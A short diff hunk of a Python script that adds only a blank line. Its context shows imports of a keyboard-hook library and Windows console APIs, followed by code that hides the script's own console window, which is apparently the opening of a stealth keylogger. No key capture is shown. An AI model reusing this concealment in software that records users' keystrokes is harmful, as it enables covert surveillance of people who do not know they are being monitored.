@@ -1,6 +1,7 @@
 import pythoncom, pyHook, win32gui, win32console, os
 from time import strftime
 
+
 window = win32console.GetConsoleWindow()  #go to script window
 win32gui.ShowWindow(window,0)
 
